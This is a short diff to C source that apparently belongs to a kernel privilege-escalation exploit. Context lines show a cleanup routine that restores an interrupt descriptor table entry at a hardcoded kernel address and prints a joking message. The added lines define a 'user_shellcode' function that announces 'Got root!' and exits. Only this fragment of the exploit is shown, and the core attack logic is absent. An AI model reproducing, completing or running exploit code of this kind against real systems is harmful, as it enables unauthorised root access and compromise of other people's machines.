@@ -204,3 +204,8 @@ void _springcleaning() {
 	setidt(IDT_DTRACE_RET, 0xFFFFFFFF825FED10, SDT_SYSIGT, SEL_UPL, 0);
 	printf("All clean! Mother would be so proud!\nReturning you to your regularly scheduled program!\n");
 }
+
+void user_shellcode() {
+	printf(" [*] Got root!\n");
+    exit(0);
+}
